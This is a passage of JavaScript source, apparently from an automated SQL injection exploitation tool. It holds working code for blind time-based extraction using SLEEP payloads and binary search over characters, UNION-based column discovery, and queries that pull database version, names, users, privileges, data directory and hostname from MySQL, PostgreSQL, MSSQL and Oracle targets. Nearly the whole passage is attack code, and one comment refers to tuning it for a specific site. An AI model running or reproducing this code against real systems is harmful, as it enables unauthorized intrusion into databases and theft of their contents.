            name: hint?.name || null
        };
        
        // Log initial DB hint info
        if (hint) {
            domainLogger.logDbExtraction('Initial DB hint from error detection', {
                method: 'error_detection',
                query: 'N/A',
                response: JSON.stringify(hint),
                success: true
            });
        }

        // Try different extraction methods based on vulnerability type
        if (vulnType === 'union') {
            await this._attemptUnionExtraction(baseUrlObj, param, dbInfo);
        } else if (vulnType === 'error') {
            await this._attemptErrorBasedExtraction(baseUrlObj, param, dbInfo);
        } else if (vulnType === 'time' || vulnType === 'boolean') {
            // Try blind extraction for time-based or boolean injection
            await this._attemptBlindExtraction(baseUrlObj, param, dbInfo, vulnType);
        }
        
        // Log final extraction results
        domainLogger.logDbExtraction('Database extraction completed', {
            method: vulnType,
            query: `Parameter: ${param}`,
            response: JSON.stringify(dbInfo),
            success: !!(dbInfo.type || dbInfo.version || dbInfo.name)
        });

        this.logger?.info(`Final extracted DB info`, dbInfo);
        // Always return dbInfo object, even if extraction failed
        // This prevents "Unknown" display in results
        return dbInfo;
    }

    /**
     * Attempt blind SQL injection extraction (time-based or boolean-based)
     */
    async _attemptBlindExtraction(baseUrlObj, param, dbInfo, vulnType = 'time') {
        const originalValue = baseUrlObj.searchParams.get(param);
        const domainLogger = await getDomainLogger(baseUrlObj.toString());
        
        this.logger?.info(`Starting blind extraction for ${param}`, { vulnType, originalValue });
        domainLogger.logDbExtraction('Starting blind SQL extraction', {
            method: `blind_${vulnType}`,
            query: `Parameter: ${param}, Original value: ${originalValue}`,
            response: 'Starting...',
            success: false
        });
        
        // Helper function to create conditional payloads
        const createPayload = (condition, delayTime = 1) => {
            // Always use time-based for this site since boolean gives 500 errors
            return `' AND IF(${condition},SLEEP(${delayTime}),0)-- -`;
        };
        
        // Helper to check if condition is true
        const checkCondition = async (condition) => {
            const testUrlObj = new URL(baseUrlObj);
            const payload = createPayload(condition);
            testUrlObj.searchParams.set(param, originalValue + payload);
            
            this.logger?.debug(`Checking condition: ${condition}`);
            this.logger?.debug(`Full URL: ${testUrlObj.toString()}`);
            
            const start = Date.now();
            try {
                const _response = await this._makeRequest(testUrlObj.toString());
                const duration = Date.now() - start;
                
                // Always check for time delay since we're using time-based payloads
                const delayed = duration > 800; // 0.8 seconds threshold for 1 second delay
                
                this.logger?.debug(`Condition check result: ${delayed} (duration: ${duration}ms)`);
                
                if (delayed) {
                    this.logger?.info(`Condition TRUE: ${condition} (delayed ${duration}ms)`);
                }
                
                return delayed;
            } catch (error) {
                this.logger?.error(`Error checking condition: ${error.message}`, { condition, url: testUrlObj.toString() });
                domainLogger.logDbExtraction('Condition check failed', {
                    method: `blind_${vulnType}`,
                    query: condition,
                    response: error.message,
                    success: false
                });
                return false;
            }
        };
        
        // Helper to extract a single character at a position
        const extractSingleChar = async (query, position, totalLength) => {
            let low = 32, high = 126; // Printable ASCII range
            let foundChar = null;
            
            // Binary search for the character
            while (low <= high) {
                const mid = Math.floor((low + high) / 2);
                const condition = `ASCII(SUBSTRING(${query},${position},1))>${mid}`;
                
                if (await checkCondition(condition)) {
                    low = mid + 1;
                } else {
                    // Check if it equals mid
                    const eqCondition = `ASCII(SUBSTRING(${query},${position},1))=${mid}`;
                    if (await checkCondition(eqCondition)) {
                        foundChar = String.fromCharCode(mid);
                        break;
                    }
                    high = mid - 1;
                }
            }
            
            // Validate the character is printable ASCII
            if (foundChar && foundChar.charCodeAt(0) >= 32 && foundChar.charCodeAt(0) <= 126) {
                // Update progress display
                process.stdout.write(`\r🔍 Extracting ${query.substring(0, 20)}... [${position}/${totalLength}] ✓${' '.repeat(20)}`);
                return foundChar;
            } else {
                // Update progress display
                process.stdout.write(`\r🔍 Extracting ${query.substring(0, 20)}... [${position}/${totalLength}] ✗${' '.repeat(20)}`);
                return null;
            }
        };
        
        // Extract using binary search for efficiency
        const extractString = async (query, maxLength = 50) => {
            let result = '';
            
            // First, find the actual length using binary search for faster results
            let stringLength = 0;
            let low = 1, high = maxLength;
            
            // Show progress for length finding
            process.stdout.write(`\r📏 Finding length of ${query.substring(0, 20)}...`);
            
            while (low <= high) {
                const mid = Math.floor((low + high) / 2);
                const condition = `LENGTH(${query})>=${mid}`;
                
                if (await checkCondition(condition)) {
                    stringLength = mid;
                    low = mid + 1;
                    
                    // Check exact length
                    const exactCondition = `LENGTH(${query})=${mid}`;
                    if (await checkCondition(exactCondition)) {
                        stringLength = mid;
                        break;
                    }
                } else {
                    high = mid - 1;
                }
            }
            
            if (stringLength === 0) {
                process.stdout.write(`\r❌ Could not determine length for ${query.substring(0, 20)}${' '.repeat(30)}\n`);
                return null;
            }
            
            process.stdout.write(`\r✅ Found length: ${stringLength}${' '.repeat(50)}\n`);
            
            // Extract characters with multithreading
            const CONCURRENT_CHARS = 3; // Extract 3 characters at a time
            const charPromises = [];
            let extractedSoFar = '';
            
            // Process characters in batches
            for (let batchStart = 1; batchStart <= stringLength; batchStart += CONCURRENT_CHARS) {
                const batchEnd = Math.min(batchStart + CONCURRENT_CHARS - 1, stringLength);
                const batchPromise = (async () => {
                    // Extract characters in this batch concurrently
                    const promises = [];
                    for (let pos = batchStart; pos <= batchEnd; pos++) {
                        promises.push(extractSingleChar(query, pos, stringLength));
                    }
                    
                    const chars = await Promise.all(promises);
                    return { start: batchStart, chars };
                })();
                
                charPromises.push(batchPromise);
                
                // Limit concurrent batches to avoid overwhelming the server
                if (charPromises.length >= 2) {
                    const batch = await charPromises.shift();
                    for (let i = 0; i < batch.chars.length; i++) {
                        if (batch.chars[i] === null) {
                            // Stop extraction if we hit a null character
                            stringLength = batch.start + i - 1;
                            break;
                        }
                        result += batch.chars[i];
                        extractedSoFar = result;
                        // Show partial results as we extract
                        process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(Math.max(0, stringLength - extractedSoFar.length))}${' '.repeat(20)}`);
                    }
                }
            }
            
            // Wait for remaining batches
            const remainingBatches = await Promise.all(charPromises);
            for (const batch of remainingBatches) {
                // Skip batches that are beyond our adjusted string length
                if (batch.start > stringLength) continue;
                
                for (let i = 0; i < batch.chars.length; i++) {
                    const charPos = batch.start + i - 1;
                    if (charPos > stringLength) break;
                    
                    if (batch.chars[i] === null) {
                        // Stop extraction if we hit a null character
                        stringLength = charPos - 1;
                        break;
                    }
                    result += batch.chars[i];
                    extractedSoFar = result;
                    // Show partial results as we extract
                    process.stdout.write(`\r💾 Extracted so far: ${extractedSoFar}${'*'.repeat(Math.max(0, stringLength - extractedSoFar.length))}${' '.repeat(20)}`);
                }
            }
            
            // Clean up result - remove any trailing '?' or garbage
            result = result.replace(/[?+]+$/, '');
            
            // Validate the extracted result
            if (result && result.length > 2) {
                // Check if result contains too many non-ASCII or corrupted characters
                const nonAsciiCount = (result.match(/[^\x20-\x7E]/g) || []).length;
                const questionMarkCount = (result.match(/\?/g) || []).length;
                
                if (nonAsciiCount > result.length * 0.2 || questionMarkCount > result.length * 0.3) {
                    process.stdout.write(`\r❌ Extracted data appears corrupted: ${result.substring(0, 20)}...${' '.repeat(30)}\n`);
                    domainLogger.logDbExtraction('Extracted data corrupted', {
                        method: `blind_${vulnType}_extraction`,
                        query: query,
                        response: result,
                        success: false
                    });
                    return null;
                } else {
                    process.stdout.write(`\r✅ Extracted: ${result}${' '.repeat(30)}\n`);
                    domainLogger.logDbExtraction('Data extraction successful', {
                        method: `blind_${vulnType}_extraction`,
                        query: query,
                        response: result,
                        success: true
                    });
                    return result;
                }
            }
            
            process.stdout.write(`\r❌ Failed to extract valid data${' '.repeat(50)}\n`);
            domainLogger.logDbExtraction('Data extraction failed', {
                method: `blind_${vulnType}_extraction`,
                query: query,
                response: 'Empty or invalid result',
                success: false
            });
            return null;
        };
        
        try {
            // Step 1: Detect database type by checking VERSION() pattern
            process.stdout.write(`\r🔎 Detecting database type...${' '.repeat(50)}`);
            
            // Check if it's MySQL/MariaDB by checking if VERSION() starts with a number
            if (await checkCondition(`SUBSTRING(VERSION(),1,1)>='0' AND SUBSTRING(VERSION(),1,1)<='9'`)) {
                process.stdout.write(`\r✅ Detected MySQL/MariaDB${' '.repeat(50)}\n`);
                dbInfo.type = 'MySQL';
                domainLogger.logDbExtraction('Database type detected', {
                    method: `blind_${vulnType}`,
                    query: `SUBSTRING(VERSION(),1,1)>='0' AND SUBSTRING(VERSION(),1,1)<='9'`,
                    response: 'MySQL/MariaDB confirmed',
                    success: true
                });
                
                // Extract version - first 10 chars should be enough (e.g., "5.7.32-log")
                process.stdout.write(`📊 Extracting database version...\n`);
                const version = await extractString(`SUBSTRING(VERSION(),1,10)`);
                if (version) {
                    dbInfo.version = version;
                    // Refine type based on version
                    if (version.includes('.')) {
                        dbInfo.type = 'MySQL';
                    }
                    domainLogger.logDbExtraction('Database version extracted', {
                        method: `blind_${vulnType}`,
                        query: `SUBSTRING(VERSION(),1,10)`,
                        response: version,
                        success: true
                    });
                } else {
                    domainLogger.logDbExtraction('Database version extraction failed', {
                        method: `blind_${vulnType}`,
                        query: `SUBSTRING(VERSION(),1,10)`,
                        response: 'Failed to extract',
                        success: false
                    });
                }
                
                // Extract database name
                process.stdout.write(`📊 Extracting database name...\n`);
                const dbName = await extractString(`DATABASE()`);
                if (dbName) {
                    dbInfo.name = dbName;
                    domainLogger.logDbExtraction('Database name extracted', {
                        method: `blind_${vulnType}`,
                        query: `DATABASE()`,
                        response: dbName,
                        success: true
                    });
                } else {
                    domainLogger.logDbExtraction('Database name extraction failed', {
                        method: `blind_${vulnType}`,
                        query: `DATABASE()`,
                        response: 'Failed to extract',
                        success: false
                    });
                }
                
                // Try to get all database names (limit to first 100 chars)
                process.stdout.write(`📊 Extracting all database names...\n`);
                const allDbs = await extractString(
                    `(SELECT SUBSTRING(GROUP_CONCAT(schema_name),1,100) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`
                );
                if (allDbs) {
                    dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
                }
                
            } else if (await checkCondition(`VERSION() LIKE '%PostgreSQL%'`)) {
                dbInfo.type = 'PostgreSQL';
                
                // Extract version for PostgreSQL
                const version = await extractString(`SUBSTRING(VERSION(),1,20)`);
                if (version) {
                    dbInfo.version = version;
                }
                
                // Extract current database
                const dbName = await extractString(`CURRENT_DATABASE()`);
                if (dbName) {
                    dbInfo.name = dbName;
                }
                
            } else if (await checkCondition(`@@VERSION LIKE '%Microsoft SQL Server%'`)) {
                dbInfo.type = 'Microsoft SQL Server';
                
                // Extract version
                const version = await extractString(`SUBSTRING(@@VERSION,1,30)`);
                if (version) {
                    dbInfo.version = version;
                }
                
                // Extract database name
                const dbName = await extractString(`DB_NAME()`);
                if (dbName) {
                    dbInfo.name = dbName;
                }
                
            } else {
                // Try generic extraction assuming MySQL syntax
                this.logger?.info(`Database type unknown, trying MySQL syntax...`);
                
                // Check if VERSION() returns something
                const versionCheck = await checkCondition(`LENGTH(VERSION())>0`);
                if (versionCheck) {
                    const version = await extractString(`SUBSTRING(VERSION(),1,15)`);
                    if (version) {
                        dbInfo.version = version;
                        dbInfo.type = this._detectDbType(version) || 'Unknown (MySQL-compatible)';
                    }
                }
                
                // Try DATABASE()
                const dbCheck = await checkCondition(`LENGTH(DATABASE())>0`);
                if (dbCheck) {
                    const dbName = await extractString(`DATABASE()`);
                    if (dbName) {
                        dbInfo.name = dbName;
                    }
                }
            }
            
        } catch (error) {
            this.logger?.error(`Blind extraction failed`, { error: error.message });
        }
        
        // Validate the final extracted database info
        if (this._isValidDatabaseInfo(dbInfo) && (dbInfo.type || dbInfo.version || dbInfo.name)) {
            this.logger?.info(`Blind extraction completed successfully`, dbInfo);
            return dbInfo;
        } else {
            this.logger?.warn(`Blind extraction completed but data appears invalid`, dbInfo);
            return { type: null, version: null, name: null };
        }
    }
    
    /**
     * Attempt UNION-based extraction
     */
    async _attemptUnionExtraction(baseUrlObj, param, dbInfo) {
        const originalValue = baseUrlObj.searchParams.get(param);
        const domainLogger = await getDomainLogger(baseUrlObj.toString());
        let workingPayload = null;
        let columnCount = 0;
        let dataColumn = -1;
        
        // Step 1: Find the correct number of columns (try up to 50)
        this.logger?.info(`Testing UNION column count for ${param}`);
        
        let previousLength = 0;
        let stableCount = 0;
        const lengthCounts = new Map(); // Track which lengths appear how often
        
        for (let cols = 1; cols <= 50; cols++) {
            try {
                const testUrlObj = new URL(baseUrlObj);
                // Use negative ID to isolate UNION results
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const unionPayload = ` UNION SELECT ${Array(cols).fill('NULL').join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                const currentLength = response.data.length;
                
                // Track response lengths
                lengthCounts.set(currentLength, (lengthCounts.get(currentLength) || 0) + 1);
                
                // Debug logging
                if (cols <= 5 || cols % 10 === 0) {
                    this.logger?.debug(`Testing ${cols} columns`, {
                        status: response.status,
                        length: currentLength,
                        lengthDiff: currentLength - previousLength,
                        hasError: response.data.includes('error') || response.data.includes('Error'),
                        sample: response.data.substring(0, 200)
                    });
                }
                
                // Check if this column count works
                const responseText = response.data.toLowerCase();
                const hasColumnError = responseText.includes('different number of columns') ||
                                     responseText.includes('columns') ||
                                     responseText.includes('operand should contain') ||
                                     responseText.includes('used have a different number');
                
                const hasSQLError = responseText.includes('sql syntax') ||
                                   responseText.includes('mysql') && responseText.includes('error') ||
                                   responseText.includes('warning:') ||
                                   responseText.includes('mysqli');
                
                // Method 1: Look for SQL errors
                if (hasColumnError || hasSQLError) {
                    this.logger?.debug(`Column error at ${cols} columns`);
                    continue;
                }
                
                // Method 2: Try injecting a test value to see if it reflects
                if (response.status === 200 && !hasColumnError && !hasSQLError) {
                    const testUrlObj2 = new URL(baseUrlObj);
                    const testValue = `0x${Buffer.from(`COL${cols}TEST`).toString('hex')}`;
                    const columns2 = Array(cols).fill('NULL');
                    columns2[Math.floor(cols/2)] = testValue; // Try middle column
                    const unionPayload2 = ` UNION SELECT ${columns2.join(',')}-- -`;
                    testUrlObj2.searchParams.set(param, negativeId + unionPayload2);
                    
                    const response2 = await this._makeRequest(testUrlObj2.toString());
                    
                    // If we see our test value, we found the right column count
                    if (response2.data.includes(`COL${cols}TEST`)) {
                        columnCount = cols;
                        this.logger?.info(`Found working column count via reflection: ${cols}`);
                        break;
                    }
                }
                
                // Method 3: Look for stable response length (same length 3 times)
                if (currentLength === previousLength) {
                    stableCount++;
                    if (stableCount >= 2) {
                        // Also verify with a different value
                        const testUrlObj3 = new URL(baseUrlObj);
                        const columns3 = Array(cols).fill('1');
                        const unionPayload3 = ` UNION SELECT ${columns3.join(',')}-- -`;
                        testUrlObj3.searchParams.set(param, negativeId + unionPayload3);
                        
                        const response3 = await this._makeRequest(testUrlObj3.toString());
                        
                        if (Math.abs(response3.data.length - currentLength) < 100) {
                            columnCount = cols;
                            this.logger?.info(`Found working column count via stable length: ${cols}`);
                            break;
                        }
                    }
                } else {
                    stableCount = 0;
                }
                
                // Method 4: Detect linear length increase pattern (NULL values being displayed)
                if (cols > 2 && previousLength > 0) {
                    const lengthDiff = currentLength - previousLength;
                    if (lengthDiff > 0 && lengthDiff < 50) {
                        // For linear patterns, continue testing more columns
                        // Don't stop too early - websites may have many columns
                        if (cols < 40) {
                            // Keep testing
                            previousLength = currentLength;
                            continue;
                        }
                        
                        // After testing enough columns, confirm the pattern
                        const testUrlObj4 = new URL(baseUrlObj);
                        const testCols = 32; // Common column count
                        const unionPayload4 = ` UNION SELECT ${Array(testCols).fill('NULL').join(',')}-- -`;
                        testUrlObj4.searchParams.set(param, negativeId + unionPayload4);
                        
                        try {
                            const response4 = await this._makeRequest(testUrlObj4.toString());
                            // Calculate expected length based on pattern
                            const expectedLength = response.data.length + (testCols - cols) * lengthDiff;
                            
                            if (Math.abs(response4.data.length - expectedLength) < 100) {
                                columnCount = testCols;
                                this.logger?.info(`Found working column count via linear pattern: ${testCols} (${lengthDiff} bytes per column)`);
                                break;
                            }
                        } catch (error) {
                            // Try with current column count
                            columnCount = cols;
                            this.logger?.info(`Found working column count via linear pattern: ${cols} (${lengthDiff} bytes per column)`);
                            break;
                        }
                    }
                }
                
                previousLength = currentLength;
                
            } catch (error) {
                this.logger?.debug(`Error testing ${cols} columns: ${error.message}`);
            }
        }
        
        // If we still haven't found it, try the most common response length
        if (columnCount === 0 && lengthCounts.size > 0) {
            // Find the most common response length
            let maxCount = 0;
            let mostCommonLength = 0;
            for (const [length, count] of lengthCounts) {
                if (count > maxCount) {
                    maxCount = count;
                    mostCommonLength = length;
                }
            }
            
            // Test columns that gave this length
            for (let cols = 1; cols <= 50; cols++) {
                const testUrlObj = new URL(baseUrlObj);
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const unionPayload = ` UNION SELECT ${Array(cols).fill('NULL').join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                try {
                    const response = await this._makeRequest(testUrlObj.toString());
                    if (Math.abs(response.data.length - mostCommonLength) < 50) {
                        columnCount = cols;
                        this.logger?.info(`Found probable column count: ${cols} (based on common length)`);
                        break;
                    }
                } catch (error) {
                    // Continue
                }
            }
        }
        
        if (columnCount === 0) {
            this.logger?.warn(`Could not determine column count for UNION injection`);
            return;
        }
        
        // Step 2: Find which column(s) are displayed (try each position)
        const testString = `CONCAT(0x${Buffer.from('TESTMARKER').toString('hex')},0x${Buffer.from('12345').toString('hex')})`;
        
        // Try common positions first, then all columns
        const priorityColumns = [0, Math.floor(columnCount/2), columnCount-1];
        
        for (const colIndex of priorityColumns) {
            if (colIndex >= columnCount) continue;
            
            try {
                const testUrlObj = new URL(baseUrlObj);
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const columns = Array(columnCount).fill('NULL');
                columns[colIndex] = testString;
                const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                
                if (response.data.includes('TESTMARKER12345')) {
                    dataColumn = colIndex;
                    this.logger?.info(`Found data reflection in column ${colIndex + 1}`);
                    break;
                }
            } catch (error) {
                // Continue
            }
        }
        
        // If priority columns didn't work, try all columns
        if (dataColumn === -1) {
            for (let col = 0; col < columnCount; col++) {
                if (priorityColumns.includes(col)) continue; // Skip already tested
                
                try {
                    const testUrlObj = new URL(baseUrlObj);
                    const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                    const columns = Array(columnCount).fill('NULL');
                    columns[col] = testString;
                    const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                    testUrlObj.searchParams.set(param, negativeId + unionPayload);
                    
                    const response = await this._makeRequest(testUrlObj.toString());
                    
                    if (response.data.includes('TESTMARKER12345')) {
                        dataColumn = col;
                        this.logger?.info(`Found data reflection in column ${col + 1}`);
                        break;
                    }
                } catch (error) {
                    // Continue
                }
            }
        }
        
        if (dataColumn === -1) {
            this.logger?.warn(`Could not find reflecting column in UNION injection`);
            // Try with column 0 anyway
            dataColumn = 0;
        }
        
        // Step 3: Extract database information using the found column
        const extractionQueries = [
            // MySQL/MariaDB queries - try to get all info at once
            `CONCAT(0x${Buffer.from('DBSTART:').toString('hex')},@@version,0x${Buffer.from('|').toString('hex')},DATABASE(),0x${Buffer.from('|').toString('hex')},USER(),0x${Buffer.from('|DBLIST:').toString('hex')},(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x${Buffer.from(':DBEND').toString('hex')})`,
            // Simpler version with all databases
            `CONCAT(0x${Buffer.from('VER:').toString('hex')},@@version,0x${Buffer.from('|DB:').toString('hex')},DATABASE(),0x${Buffer.from('|ALL:').toString('hex')},(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))`,
            
            // Advanced MySQL extraction - with table count
            `CONCAT(0x${Buffer.from('DB:').toString('hex')},DATABASE(),0x${Buffer.from('|TABLES:').toString('hex')},(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()),0x${Buffer.from('|VER:').toString('hex')},VERSION())`,
            
            // Extract database with user privileges
            `CONCAT(0x${Buffer.from('USER:').toString('hex')},USER(),0x${Buffer.from('|PRIVS:').toString('hex')},(SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT('''',USER(),'''')))`,
            
            // Extract with system variables
            `CONCAT(0x${Buffer.from('VER:').toString('hex')},@@version,0x${Buffer.from('|DATADIR:').toString('hex')},@@datadir,0x${Buffer.from('|HOSTNAME:').toString('hex')},@@hostname)`,
            
            // Get databases with sizes
            `(SELECT GROUP_CONCAT(CONCAT(schema_name,0x3a,ROUND(SUM(data_length+index_length)/1024/1024,2),0x4d42)) FROM information_schema.tables GROUP BY schema_name)`,
            
            // Just get all databases
            `(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x${Buffer.from(',').toString('hex')}) FROM information_schema.schemata)`,
            // Get non-system databases
            `(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x${Buffer.from(',').toString('hex')}) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`,
            
            // PostgreSQL specific
            `CONCAT(VERSION(),CHR(126),CURRENT_DATABASE())`,
            `ARRAY_TO_STRING(ARRAY(SELECT datname FROM pg_database),CHR(44))`,
            
            // MSSQL specific
            `CONCAT(@@version,CHAR(126),DB_NAME())`,
            `(SELECT STRING_AGG(name,CHAR(44)) FROM sys.databases)`,
            
            // Oracle specific 
            `(SELECT LISTAGG(OWNER,CHR(44)) WITHIN GROUP (ORDER BY OWNER) FROM ALL_USERS)`,
            
            // Basic queries
            `CONCAT(@@version,0x${Buffer.from('~~~').toString('hex')},DATABASE())`,
            `VERSION()`,
            `DATABASE()`,
            `@@version`,
            `SCHEMA()`,
            // Try with LIMIT for single database
            `(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)`
        ];
        
        for (const query of extractionQueries) {
            // Stop if we already have both name and version
            if (dbInfo.name && dbInfo.version) {
                this.logger?.info(`Already have complete DB info (name: ${dbInfo.name}, version: ${dbInfo.version}), stopping UNION extraction`);
                domainLogger.logDbExtraction('UNION extraction complete - have all required info', {
                    method: 'union',
                    query: 'Stopped - already have name and version',
                    response: JSON.stringify(dbInfo),
                    success: true
                });
                break;
            }
            
            try {
                const testUrlObj = new URL(baseUrlObj);
                const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                const columns = Array(columnCount).fill('NULL');
                columns[dataColumn] = query;
                const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                testUrlObj.searchParams.set(param, negativeId + unionPayload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                
                if (response.status === 200) {
                    // Look for extracted data
                    const responseText = response.data;
                    
                    // Check for our markers
                    if (responseText.includes('DBSTART:') && responseText.includes(':DBEND')) {
                        const match = responseText.match(/DBSTART:([^|]+)\|([^|]+)\|([^|]+)\|DBLIST:([^:]+):DBEND/);
                        if (match) {
                            dbInfo.version = match[1].trim();
                            dbInfo.name = match[2].trim();
                            dbInfo.type = this._detectDbType(match[1]);
                            // Extract all databases
                            const allDbs = match[4].trim();
                            if (allDbs) {
                                dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
                            }
                            
                            // Log only relevant response with domain logger
                            const relevantResponse = this._extractRelevantResponse(responseText, 'DBSTART:');
                            domainLogger.logDbExtraction('UNION extraction successful (DBSTART markers)', {
                                method: 'union',
                                query: query,
                                response: relevantResponse,
                                success: true,
                                extractedInfo: dbInfo
                            });
                            
                            this.logger?.info(`Extracted via markers:`, dbInfo);
                            workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                            break;
                        }
                        // Try older format without DBLIST
                        const oldMatch = responseText.match(/DBSTART:([^:]+)\|([^|]+)\|([^:]+):DBEND/);
                        if (oldMatch) {
                            dbInfo.version = oldMatch[1].trim();
                            dbInfo.name = oldMatch[2].trim();
                            dbInfo.type = this._detectDbType(oldMatch[1]);
                            this.logger?.info(`Extracted via markers (old format):`, dbInfo);
                            workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                            break;
                        }
                    }
                    
                    // Check for VER/DB/ALL format
                    if (responseText.includes('VER:') && responseText.includes('|ALL:')) {
                        const match = responseText.match(/VER:([^|]+)\|DB:([^|]+)\|ALL:([^<\s]+)/);
                        if (match) {
                            dbInfo.version = match[1].trim();
                            dbInfo.name = match[2].trim();
                            dbInfo.type = this._detectDbType(match[1]);
                            const allDbs = match[3].trim();
                            if (allDbs) {
                                dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
                            }
                            this.logger?.info(`Extracted all databases:`, dbInfo);
                            workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                            break;
                        }
                    }
                    
                    // Try parsing normally
                    const extracted = this._parseDbInfoFromText(responseText);
                    if (extracted && (extracted.version || extracted.name)) {
                        Object.assign(dbInfo, extracted);
                        this.logger?.info(`Successfully extracted DB info via UNION`, { ...extracted, columnUsed: dataColumn + 1 });
                        workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                        break;
                    }
                    
                    // Check for version patterns
                    const versionMatch = responseText.match(/(\\d+\\.\\d+\\.\\d+[^<\\s]*)/);
                    if (versionMatch && !versionMatch[1].startsWith('40')) {
                        dbInfo.version = versionMatch[1];
                        dbInfo.type = this._detectDbType(responseText);
                        this.logger?.info(`Found version via pattern:`, dbInfo.version);
                    }
                    
                    // Log all UNION attempts with relevant response
                    const relevantResponse = this._extractRelevantResponse(responseText, 
                        dbInfo.version || dbInfo.name || 'version\\(\\)|database\\(\\)');
                    domainLogger.logDbExtraction('UNION extraction attempt', {
                        method: 'union',
                        query: query,
                        response: relevantResponse,
                        success: !!(dbInfo.version || dbInfo.name),
                        extractedInfo: dbInfo
                    });
                }
            } catch (error) {
                this.logger?.debug(`UNION extraction failed for query: ${query}`, { error: error.message });
                
                // Log failed attempts
                domainLogger.logDbExtraction('UNION extraction failed', {
                    method: 'union',
                    query: query,
                    response: error.message,
                    success: false
                });
            }
        }
        
        // Step 4: If we have version but no database name, try to get database names
        if ((dbInfo.version || dbInfo.type) && !dbInfo.name) {
            const dbQueries = [
                `(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`,
                `(SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys') LIMIT 0,1)`,
                `DATABASE()`
            ];
            
            for (const query of dbQueries) {
                try {
                    const testUrlObj = new URL(baseUrlObj);
                    const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
                    const columns = Array(columnCount).fill('NULL');
                    columns[dataColumn] = query;
                    const unionPayload = ` UNION SELECT ${columns.join(',')}-- -`;
                    testUrlObj.searchParams.set(param, negativeId + unionPayload);
                    
                    const response = await this._makeRequest(testUrlObj.toString());
                    
                    if (response.status === 200) {
                        // Look for database names (filter out system databases)
                        const dbNameMatch = response.data.match(/([a-zA-Z0-9_]+(?:,[a-zA-Z0-9_]+)*)/);
                        if (dbNameMatch && 
                            !dbNameMatch[1].includes('information_schema') && 
                            !dbNameMatch[1].includes('performance_schema') &&
                            !dbNameMatch[1].match(/^(NULL|null|undefined)$/)) {
                            dbInfo.databases = dbNameMatch[1].split(',').filter(db => 
                                db && !['information_schema', 'performance_schema', 'mysql', 'sys'].includes(db)
                            );
                            if (dbInfo.databases.length > 0) {
                                dbInfo.name = dbInfo.databases[0]; // Use first non-system database
                                this.logger?.info(`Found databases:`, dbInfo.databases);
                                break;
                            }
                        }
                    }
                } catch (error) {
                    // Continue
                }
            }
        }
        
        if (workingPayload) {
            this.logger?.info(`UNION extraction successful`, { 
                ...dbInfo, 
                columnCount: workingPayload.columnCount,
                dataColumn: workingPayload.dataColumn
            });
        }
    }
    
    /**
     * Helper to detect database type from version string or response
     */
    _detectDbType(text) {
        if (!text) return null;
        text = text.toLowerCase();
        
        if (text.includes('mysql')) return 'MySQL';
        if (text.includes('mariadb')) return 'MariaDB';
        if (text.includes('percona')) return 'MySQL';
        if (text.includes('microsoft sql')) return 'Microsoft SQL Server';
        if (text.includes('postgresql')) return 'PostgreSQL';
        if (text.includes('oracle')) return 'Oracle';
        if (text.includes('sqlite')) return 'SQLite';
        
        // Version patterns
        if (text.match(/^\d+\.\d+\.\d+/)) return 'MySQL'; // Default to MySQL for version-only strings
        
        return null;
    }
    
    /**
     * Validate that extracted database info is not corrupted/binary data
     */
    _isValidDatabaseInfo(dbInfo) {
        if (!dbInfo) return false;
        
        // Check for binary/corrupted data patterns
        const checkString = (str) => {
            if (!str || typeof str !== 'string') return true;
            
            // Check for excessive non-ASCII characters
            const nonAsciiCount = (str.match(/[^\x20-\x7E]/g) || []).length;
            if (nonAsciiCount > str.length * 0.2) return false; // More than 20% non-ASCII
            
            // Check for common binary patterns
            if (str.includes('\x00') || str.includes('\xFF') || str.includes('\xFE')) return false;
            
            // Check for PDF/binary file signatures
            if (str.includes('%PDF') || str.includes('PNG') || str.includes('JFIF')) return false;
            
            // Check if it's mostly question marks or corrupted
            const questionMarkCount = (str.match(/\?/g) || []).length;
            if (questionMarkCount > str.length * 0.3) return false; // More than 30% question marks
            
            // Check minimum valid length
            if (str.length < 2 || str.length > 200) return false;
            
            return true;
        };
        
        // Validate each field
        if (!checkString(dbInfo.type)) return false;
        if (!checkString(dbInfo.version)) return false;
        if (!checkString(dbInfo.name)) return false;
        
        // Additional validation for version numbers
        if (dbInfo.version) {
            // Version should match common database version patterns
            // e.g., 5.7.32, 8.0.21-log, 10.5.8-MariaDB, 14.2, etc.
            const validVersionPattern = /^(\d{1,2}\.){1,3}\d{1,3}([-\w]*)?$/;
            if (!validVersionPattern.test(dbInfo.version)) return false;
            
